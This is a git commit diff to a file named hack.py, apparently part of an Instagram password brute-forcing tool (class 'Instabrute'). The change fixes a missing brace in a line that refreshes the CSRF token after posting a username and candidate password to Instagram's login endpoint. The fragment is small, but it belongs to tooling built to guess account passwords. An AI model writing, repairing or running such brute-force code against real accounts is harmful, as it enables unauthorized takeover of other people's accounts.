f752c70bb62b90e96ab199001fc92e64b8bca722
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-11-02 10:22:03 -0300

    Update hack.py

--- hack.py
+++ hack.py
@@ -125,7 +125,7 @@ class Instabrute():
 
         # Update token after login to the site
         r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username': self.username, 'password': password}, allow_redirects=True)
-        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken'])
+        sess.headers.update({'X-CSRFToken': r.cookies.get_dict()['csrftoken']})
 
         # Parse the response
  data = json.loads(r.text)
